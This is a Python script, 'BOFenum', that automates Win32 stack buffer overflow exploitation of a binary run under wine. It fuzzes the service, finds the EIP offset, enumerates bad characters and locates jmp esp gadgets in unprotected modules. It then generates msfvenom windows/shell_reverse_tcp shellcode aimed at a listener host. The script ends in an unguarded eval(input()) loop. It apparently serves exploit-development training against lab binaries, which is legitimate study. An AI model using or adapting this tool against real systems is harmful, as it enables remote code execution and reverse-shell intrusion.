#!/usr/bin/env python3

#dependency checklist: wine, pev, msfvenom
import os, sys, subprocess, re, time, socket, codecs, argparse

#command line args
parser = argparse.ArgumentParser(description='Automate win32 stack based buffer overflows. Must be run with root.')
parser.add_argument("targetBin", help="Name of target binary")
parser.add_argument("tport", help="Vulnerable port of target binary", type=int)
parser.add_argument("-p", "--prefix", help="Prefix messages to the server with a string - default \"\"", default="")
parser.add_argument("-w", "--welcomeMessage", help="If you need to press enter after the server banner is displayed, include this argument.", action="store_true")

parser.add_argument("-l", "--lport", help="Listerner port for msfvenom payload generation - default 1337", default=1337, type=int)
parser.add_argument("-H", "--lhost", help="Listerner host for msfvenom payload generation - default 127.0.0.1", default="127.0.0.1")
parser.add_argument("-r", "--rhost", help="Remote host, specify for cosmetic/report purposes - this host is never interacted with - default 127.0.0.1", default="127.0.0.1")

parser.add_argument("-f", "--fuzzStart", help="Start the fuzzing process with this amount of bytes - default 100", default=100, type=int)
parser.add_argument("-s", "--fuzzStride", help="For each fuzzing iteration, add this many bytes - default 500", default=500, type=int)

args = parser.parse_args()
print(args.targetBin)

#msf params
rhost = args.rhost
lport = args.lport
lhost = args.lhost

#binary specific params
targetBin = args.targetBin
tport = args.tport
tprefix = args.prefix
welcomeMessage = args.welcomeMessage
tpostfix = "\n"
fuzzStart = args.fuzzStart
fuzzStride = args.fuzzStride

#targetBin = "dostackbufferoverflowgood.exe"
#tport = 31337
#tprefix = ""
#welcomeMessage = False
#tpostfix = "\n"
#targetBin = "malbec.exe"
#tport = 7138
#tprefix = ""
#welcomeMessage = False
#tpostfix = ""

class winedbg:
	def __init__(self, binName):
		self.binName = binName
		self.dbgHandle = self.getWineDbgHandle()
		self.openWine(binName);
		#try to disable wine's crash handler
		p = subprocess.Popen("winetricks autostart_winedbg=disable", stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True, universal_newlines=True)
		time.sleep(6)
		#output, error = p.communicate()
		#assert(error == "")

	def openWine(self, binName):
		p = subprocess.Popen("sudo wine " + binName, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True, universal_newlines=True)

	def getWineDbgHandle(self):
		p = subprocess.Popen("sudo winedbg", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
		return p

	def getPid(self, dbgHandle, pName):
		os.write(dbgHandle.stdin.fileno(), b"\ninfo process\n");
		time.sleep(0.5)
		output = os.read(dbgHandle.stdout.fileno(), 2048).decode("utf-8")

		#dummy, err = dbgHandle.communicate(input="info process\n")
		try:
			#assert err != ""
			pid = re.findall("^.*"+pName, output, re.MULTILINE)
			assert pid != None
			assert pid != ""
			assert len(pid) == 1
			result = pid[0][1:9].lstrip("0") #sample line: 0000018c 1        'vulnserver.exe'
			return result;

		except AssertionError:
			self.mError("error getting target pid, output: " + output)
			
			exit(1)

	def attach(self, dbgHandle, pid):
		os.write(dbgHandle.stdin.fileno(), str.encode("attach " + pid + "\n"))
	
	def contUntilCrash(self, dbgHandle):
		os.write(dbgHandle.stdin.fileno(), b"cont\n");
	
	def getBytes(self, dbgHandle, address, len, bigEndian = False):
		retArr = []
		for i in range(0, len, 4):
			print("\rgetting bytes: {}/{}".format(hex(i), hex(len)), end="")
			os.write(dbgHandle.stdin.fileno(), str.encode("x " + hex(address + i) + "\n"))
			time.sleep(0.001) #race condition looool
			output = os.read(dbgHandle.stdout.fileno(), 128).decode("utf-8").split()[0]
			#print(output, end=' ')
			block = re.findall("..", output)[::1 if bigEndian else -1]
			retArr = retArr + block
		return retArr

	def examineAddr(self, dbgHandle, address):
		os.write(dbgHandle.stdin.fileno(), str.encode("x " + hex(address) + "\n"))
		time.sleep(0.2) 
		output = os.read(dbgHandle.stdout.fileno(), 1024).decode("utf-8").split()[0]
		return output;

	def disasAddr(self, dbgHandle, address):
		os.write(dbgHandle.stdin.fileno(), str.encode("disas " + hex(address) + "\n"))
		time.sleep(0.2) 
		output = os.read(dbgHandle.stdout.fileno(), 1024).decode("utf-8")
		return output;

	def getModules(self, dbgHandle, binName):
		modules = []
		os.write(dbgHandle.stdin.fileno(), str.encode("info share" + "\n"))
		time.sleep(0.5)
		output = os.read(dbgHandle.stdout.fileno(), 4096).decode("utf-8")
		for line in output.splitlines():
			if "PE" in line:
				info = line.replace("-", " ", 1).split()  #unparsed example, not consistent: PE      61f80000-61f8f000       Deferred        api-ms-win-crt-math-l1-1-0
				extension = ".exe" if(binName == (info[4] + ".exe")) else ".dll" #.exe is .exe LULW 
				#print(extension + " " + binName + " " + info[4])
				laddr = int(info[1], 16)
				uaddr = int(info[2], 16)
				modName = info[4] + extension
				modules.append(self.wineModule(modName, laddr, uaddr))

		return modules

	def printRegister(self, dbgHandle, expr):
		os.write(dbgHandle.stdin.fileno(), str.encode("print " + expr + "\n"))
		time.sleep(0.5)
		output = os.read(dbgHandle.stdout.fileno(), 4096).decode("utf-8").split()[0][2:].lstrip("0")
		return output

	def printStack(self, dbgHandle, frameIndex = 0): #frameindex: print stack frames frameindex frames below current frame 
		if frameIndex > 0:
			os.write(dbgHandle.stdin.fileno(), str.encode("dn " + str(frameIndex) + "\n"))
		os.write(dbgHandle.stdin.fileno(), str.encode("bt" + "\n"))
		time.sleep(0.5)
		output = os.read(dbgHandle.stdout.fileno(), 4096).decode("utf-8")
		return output

	def mError(self, message):
		print("[-] " + message)

	def flowMessage(self, message):
		print("[+] " + message)

	class wineModule:
		def __init__(self, moduleName, baseAddress, topAddress):
			self.moduleName = moduleName
			self.baseAddress = baseAddress
			self.topAddress = topAddress
			if not ".exe" in moduleName:
				try:
					self.modPath = subprocess.check_output("find ~/.wine -name " + self.moduleName + " | grep -v system32", shell=True).decode("utf-8").replace("\n", "") #we want syswow64 bc it contains 32 bit bins
					print(self.modPath)
				except: #catch cases where dlls are kept in the local folder
					self.modPath = "./" + moduleName
			else:
				self.modPath = moduleName
			assert len(self.modPath) > 0

		def checkModule(self, dbgHandle, badcharsList):
			if self.topAddress > 0x00FFFFFF: #save time by making sure there are no leading bad chars in the address
				for i in range(3, -1, -1):
					if (((self.topAddress >> (i * 8)) ^ (self.baseAddress >> (i * 8))) & 0x000000FF > 0): # shift both to the right-most byte, xor to only keep differing bits, & to remove bytes to the left
						flowMessage("{} has no constant badchars in its address range".format(self.moduleName))
						break #passed test, we are only interested in bytes that will remain the same, bytes to the right of differing bytes will also change
					for bchar in badcharsList:
						if (((self.topAddress >> (i * 8)) ^ (self.baseAddress >> (i * 8))) ^ bchar) == 0: #constant byte matching badchar found, bad module
							flowMessage("{} constant badchars found in address range, unsuitable for use".format(self.moduleName))
							return False
			else:
				flowMessage("{} constant badchars found in address range, unsuitable for use".format(self.moduleName))
				return False
			#https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#dll-characteristics
			nx = 0x100
			aslr = 0x40
			sseh = 0x400
			#pev dependent, readpe -H gets headers
			dllcharacteristics = int(subprocess.check_output("readpe -H " + self.modPath + ' | grep "DLL characteristics:" ', shell=True).decode("utf-8").split()[2], 0) #0 autodetects hex string
			flowMessage("{} has field 'DLL characteristics' set to {} in its header. ALSR/NX/SEH mitigations are {}".format(self.moduleName, hex(dllcharacteristics), "on" if (dllcharacteristics & (nx + aslr + sseh) != 0) else "off"))
			
			return dllcharacteristics & (nx + aslr + sseh) == 0

#readpe -H vulnserver.exe
#info share
#find ~/.wine -name api-ms-win-crt-math-l1-1-0.dll 2>/dev/null
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class pattern:
	@staticmethod
	def createPattern(length):
		pattern = ""
		charsa = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		charsb = "abcdefghijklmnopqrstuvwxyz"
		charsc = "0123456789"

		for i in range (0, length):
			if (i % 3) == 0:
				pattern += charsa[((i // 3) // (len(charsc) * len(charsb))) % len(charsc)]
			elif (i % 3) == 1:
				pattern += charsb[((i // 3) // len(charsc)) % len(charsb)]
			elif (i % 3) == 2:
				pattern += charsc[(i // 3) % len(charsc)]

		return pattern
	@classmethod
	def findPattern(cls, length, pattern):
		return cls.createPattern(length).index(pattern)

class badchars:

	def createBadChars(skipList):
		retString = ""
		for i in range (1,256): #x00 will essentially always be a badchar
			if not (i in skipList):
				retString += chr(i)
		return retString;

	def memoryCompare(badchars, memdump):
		inconsistencies = []
		badcharHexStrArr = []
		
		for b in badchars:
			charbyte = ord(b)
			badcharHexStrArr.append("{:02x}".format(charbyte))
		print(badcharHexStrArr)
		for i, byte in enumerate (badcharHexStrArr):
			if(badcharHexStrArr[i] != memdump[i]):
				inconsistencies.append(badcharHexStrArr[i])
				return inconsistencies

		return inconsistencies

def flowMessage(message):
		print(bcolors.OKGREEN + "[*] " + bcolors.ENDC + message)

def successMessage(message, color = ""):
		print(bcolors.OKBLUE + "[+] " + message + bcolors.ENDC)

def mError(message):
		print(bcolors.FAIL + "[!] " + message + bcolors.ENDC)

def mWarn(message):
		print(bcolors.WARNING  + "[-] " + bcolors.ENDC + message)

def fuzz(prefix, port, welcomeMessage = False, postfix = "\n"):
	ip = "127.0.0.1"
	timeout = 2
	string = prefix + "A" * fuzzStart
	fuzzed = False
	fOffset = 0;
	while fuzzed != True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				if welcomeMessage:
					s.recv(1024)
				flowMessage("fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string + postfix, "latin-1"))
				s.recv(1024)
				time.sleep(0.1)
		except Exception as e:
			print(e)
			fOffset = len(string) - len(prefix)
			flowMessage("fuzzing crashed at {} bytes".format(fOffset))
			fuzzed = True;

		string += fuzzStride * "A"
	return fOffset

def sendToTarget(payload, prefix, port, welcomeMessage = False, postfix = "\n"):
	ip = "127.0.0.1"
	timeout = 6
	string = prefix + payload
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip, port))
			if welcomeMessage:
					s.recv(1024)
			flowMessage("sending payload of length {}b".format(len(string) - len(prefix)))
			s.send(bytes(string + postfix, "latin-1"))
			s.recv(1024)
	except:
		flowMessage("crashed the service")
		return
	mError("service did not crash")
	return


def sendPayload(eip, prefix, port, offset = 0, payload = "", welcomeMessage = False, postfix = "\n", padding = "", targetIP = "127.0.0.1"):
	ip = targetIP
	timeout = 2
	string = prefix + "A" * offset + eip + padding + payload
	#if(stdOutSend):
	#	successMessage("exploit buffer: " + prefix + "A" * offset + eip + padding + payload)
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip, port))
			if welcomeMessage:
					s.recv(1024)
			print("sending payload of length {}b".format(len(string) - len(prefix)))
			s.send(bytes(string + postfix, "latin-1"))

			s.recv(1024)
	except:
		flowMessage("crashed the service")
		return
	mError("service did not crash")
	return

def closeWine(wsession):
	del wsession
	flowMessage("restarting wine...")
	p = subprocess.Popen("sudo pkill -f wine", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True);

def findFollowingLine(text, rpattern):
    lines = text.splitlines()
    for i, line in enumerate(lines):
        if re.search(rpattern, line):
            return lines[i+1]

def generateShellCode(lhost, lport, badcharList):
	bcharFormatted = "\"\\x00"
	for bc in badcharList:
		bcharFormatted += "\\x{:02x}".format(bc)
	bcharFormatted += "\"" 

	#jank warning
	output = subprocess.check_output("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -b {} -f c".format(lhost, lport, bcharFormatted), shell=True).decode("utf-8").split("=")[1].replace("\n", "").replace("\"", "").replace("\\x", "").replace(" ", "").replace(";","")
	hexStrArr = re.findall("..", output)
	shellcode = ""
	for byteStr in hexStrArr:
		shellcode += chr(int(byteStr,16))

	return shellcode

def generateShellCodeRaw(lhost, lport, badcharList):
	bcharFormatted = "\"\\x00"
	for bc in badcharList:
		bcharFormatted += "\\x{:02x}".format(bc)
	bcharFormatted += "\"" 

	#jank warning
	msfRaw = subprocess.check_output("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -b {} -f c".format(lhost, lport, bcharFormatted), shell=True).decode("utf-8")
	return msfRaw

def findGadget(dbgSession, mod, gadget, memDump):
	flowMessage("\nsearching {} for {}...".format(mod.moduleName, gadget))
	for i, byte in enumerate(memDump):
		print("\rprogress: {}/{}".format(hex(i + mod.baseAddress - 1), hex(mod.topAddress)), end="")
		msb = gadget.split()[0]
		lsb = gadget.split()[1]
		if(i < (len(memDump) - 1) and memDump[i] == msb and memDump[i+1] == lsb):
			print()
			successMessage("Gadget {} found at {}!".format(gadget, hex(i + mod.baseAddress )))
			#flowMessage(dump[i] + " " + dump[i + 1])
			#flowMessage(session.examineAddr(session.dbgHandle, i + mod.baseAddress ))
			flowMessage(dbgSession.disasAddr(dbgSession.dbgHandle, i + mod.baseAddress ))
			return(i + mod.baseAddress)
	mWarn("gadget {} not found in module {}".format(gadget, mod.moduleName))
	return -1

def charToHex(char):
	return "\\x{:02x}".format(ord(char))

t0 = time.time()
print(bcolors.HEADER + "BOFenum v. 0.01" + bcolors.ENDC)
art =("   ___  ____  ____                  \n"
"  / _ )/ __ \\/ __/__ ___  __ ____ _ \n"
" / _  / /_/ / _// -_) _ \\/ // /  ' \\\n"
"/____/\\____/_/  \\__/_//_/\\_,_/_/_/_/\n")
print(bcolors.HEADER + art + bcolors.ENDC)
session = winedbg("./" + targetBin)
targetPid = session.getPid(session.dbgHandle, targetBin)

flowMessage("got pid of {}: {}".format(targetBin, targetPid))
session.attach(session.dbgHandle, "0x"+targetPid)
flowMessage("attached to {}: {}".format(targetBin, targetPid))
eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}".format(eiptest))
flowMessage("resuming until fuzzing crashes...")
session.contUntilCrash(session.dbgHandle)

fuzzOffset = fuzz(tprefix, tport, welcomeMessage, tpostfix);
a = os.read(session.dbgHandle.stdout.fileno(), 4096).decode("utf-8")
flowMessage(a)

eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}".format(eiptest))

closeWine(session)

time.sleep(1)

pat = pattern.createPattern(fuzzOffset)
flowMessage("generated pattern: {}".format(pat))

session = winedbg("./" + targetBin)
targetPid = session.getPid(session.dbgHandle, targetBin)
flowMessage("got pid of {}: {}".format(targetBin, targetPid))
session.attach(session.dbgHandle, "0x"+targetPid)
flowMessage("attached to {}: {}".format(targetBin, targetPid))
eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently {}".format(eiptest))
flowMessage("sending pattern to {}...".format(targetBin))
session.contUntilCrash(session.dbgHandle)

sendToTarget(pat, tprefix, tport, welcomeMessage, tpostfix)
time.sleep(1)
a = os.read(session.dbgHandle.stdout.fileno(), 4096).decode("utf-8")

flowMessage(a)

eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}".format(eiptest))
eipReverse = re.findall("..", eiptest)[::-1]
eipstring = ""
for byte in eipReverse:
	eipstring += bytes.fromhex(byte).decode("utf-8")
flowMessage("eip is " + eipstring)
offset = pattern.findPattern(fuzzOffset, eipstring)
successMessage("match found at offset {}".format(offset))

closeWine(session)

time.sleep(1)
pat = pat[:offset] + "1337"
flowMessage("generated assert pattern: {}".format(pat))

session = winedbg("./" + targetBin)
targetPid = session.getPid(session.dbgHandle, targetBin)
flowMessage("got pid of {}: {}".format(targetBin, targetPid))
session.attach(session.dbgHandle, "0x"+targetPid)
flowMessage("attached to {}: {}".format(targetBin, targetPid))
eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}".format(eiptest))
flowMessage("sending pattern to {}...".format(targetBin))
session.contUntilCrash(session.dbgHandle)

sendToTarget(pat, tprefix, tport, welcomeMessage, tpostfix)
time.sleep(1)
a = os.read(session.dbgHandle.stdout.fileno(), 4096).decode("utf-8")

eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}".format(eiptest))
eipReverse = re.findall("..", eiptest)[::-1]
eipstring = ""
for byte in eipReverse:
	eipstring += bytes.fromhex(byte).decode("utf-8")
flowMessage("eip is " + eipstring)
if eipstring == "1337":
	successMessage("offset asserted".format(offset))
else:
	mError("failed to assert control of EIP")


badcharsRemaining = True
badCharHexStrList = []
confirmedBadchars = []
while(badcharsRemaining):
	closeWine(session)

	time.sleep(1)
	bc = badchars.createBadChars(confirmedBadchars)
	flowMessage("generated {} badchars: {}".format(len(bc),bc))

	session = winedbg("./" + targetBin)
	targetPid = session.getPid(session.dbgHandle, targetBin)
	flowMessage("got pid of {}: {}".format(targetBin, targetPid))
	session.attach(session.dbgHandle, "0x"+targetPid)
	flowMessage("attached to {}: {}".format(targetBin, targetPid))
	eiptest = session.printRegister(session.dbgHandle, "$eip")
	flowMessage("eip is currently 0x{}".format(eiptest))
	flowMessage("sending badchars to {}...".format(targetBin))
	session.contUntilCrash(session.dbgHandle)
	time.sleep(1)
	sendPayload("BBBB", tprefix, tport, offset, bc, welcomeMessage, tpostfix)
	time.sleep(1)
	a = os.read(session.dbgHandle.stdout.fileno(), 4096).decode("utf-8")

	try:
		print(findFollowingLine(a, "^Stack").split()[0][2:].lstrip("0").rstrip(":"))
	except:
		print(findFollowingLine(a, "^Stack").split()[0])

	eipAddress = int(findFollowingLine(a, "^Stack").split()[0][2:].lstrip("0").rstrip(":"), 16) - 4

	flowMessage("retrieving potential badchars from the stack...")
	stackdump = session.getBytes(session.dbgHandle, eipAddress + 4, len(bc))
	print(len(stackdump))
	flowMessage("stack: {}".format(' '.join(stackdump)))
	flowMessage("comparing badchars with memory dump")
	inconsistencies = badchars.memoryCompare(bc, stackdump)
	if(len(inconsistencies) > 0):
		mWarn("inconsistencies found, possible badchars: {}".format(" ".join(inconsistencies)))
		for byte in inconsistencies:
			print("removing " + byte)
			badCharHexStrList.append(byte)
			confirmedBadchars.append(int(byte, 16))
	else:
		successMessage("no inconsistencies found, the only remaining badchar should be 0x00.")
		badcharsRemaining = False
	time.sleep(1)

flowMessage("searching for a suitable gadget module...")
modules = session.getModules(session.dbgHandle, targetBin)

jmpesp = 0
jmpespCharEncode = ""

#TODO: add more gadgets
gadgets =  ["ff e4", # jmp esp
			"54 c3"] # push esp, ret; 

for mod in modules:
	if(mod.checkModule(session.dbgHandle, confirmedBadchars)):
		dump = session.getBytes(session.dbgHandle, mod.baseAddress, mod.topAddress - mod.baseAddress)
		for gadget in gadgets:
			gadgetAddr = findGadget(session, mod, gadget, dump)
			if gadgetAddr > 0:
				jmpesp = gadgetAddr
				jmpespCharEncode = "".join([chr((jmpesp) & 0xFF), chr((jmpesp >> 8) & 0xFF), chr((jmpesp >> 16) & 0xFF), chr(jmpesp >> 24)]) #concat address bytes into string, reverse endianness
				print(jmpespCharEncode)
				break;
		if(jmpesp > 0):
			break;
		

	
	

closeWine(session)

time.sleep(1)

session = winedbg("./" + targetBin)
targetPid = session.getPid(session.dbgHandle, targetBin)
flowMessage("got pid of {}: {}".format(targetBin, targetPid))
session.attach(session.dbgHandle, "0x"+targetPid)
flowMessage("attached to {}: {}".format(targetBin, targetPid))
eiptest = session.printRegister(session.dbgHandle, "$eip")
flowMessage("eip is currently 0x{}, target is {}".format(eiptest, hex(jmpesp)))
sc = generateShellCodeRaw(lhost, lport, confirmedBadchars)
successMessage("Compiling final enumeration results...")

print()
print("\t-------------")
print()
print("Static values:")

print("lhost  = \"{}\"".format(lhost))
print("lport  = {}".format(lport))
print("rhost  = \"{}\"".format(rhost))
print("rport  = {}".format(tport))
print("prefix = \"{}\"".format(tprefix))

print()
print("\t-------------")
print()
print("Enumerated values:")

print("badchars = \"{}\"".format((" 00 " + ' '.join(badCharHexStrList)).replace(" ", "\\x")))
print("retn = \"{}\"".format(charToHex(jmpespCharEncode[0])+charToHex(jmpespCharEncode[1])+charToHex(jmpespCharEncode[2])+charToHex(jmpespCharEncode[3])))
print("offset = \"{}\"".format(str(offset) + " * A"))

print()
print("\t-------------")
print()
print("Shellcode (msfvenom): ")

print("{}".format(sc))
t1 = time.time()

flowMessage("Execution stopped after {} seconds.".format(round(t1-t0, 3)))
while 1 == 1:
	eval(input())
